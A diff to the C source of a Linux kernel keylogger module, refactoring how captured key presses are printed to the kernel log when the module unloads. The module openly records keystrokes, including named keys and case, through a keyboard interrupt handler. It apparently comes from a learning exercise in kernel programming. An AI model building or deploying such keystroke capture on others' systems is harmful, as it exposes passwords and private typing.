@@ -375,33 +375,24 @@ static struct miscdevice		dev = {
 	&ops
 };
 
-static void		key_log_print_unified(void)
+static void	key_logprint(struct key_log_entry *log, void *ptr)
 {
-	ssize_t			i;
-	struct key_log_index	*lst;
-	struct key_log_entry	*log;
-	char			ascii;
+	char		ascii;
 
-	for (lst = key_log_last(key_full_log); lst; lst = lst->prev) {
-		for (i = 0; i < lst->used; i++) {
-			log = &lst->entries[i];
-			if (log->event != PRESS)
-				continue;
-			ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
-			if (ascii != 0x0)
-				pr_info(KERN_CONT "%c", ascii);
-			else
-				pr_info(KERN_CONT "[%s]",
-				       (log->upper_case ? log->key->upper_name : log->key->name));
-		}
-		pr_info("");
-	}
+	if (log->event != PRESS)
+		return ;
+	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
+	if (ascii != 0x0)
+		pr_info(KERN_CONT "%c", ascii);
+	else
+		pr_info(KERN_CONT "[%s]",
+		    (log->upper_case ? log->key->upper_name : log->key->name));
 }
 
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
-	key_log_print_unified();
+	key_log_iter(&key_logprint, NULL);
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
 	if (workqueue) {
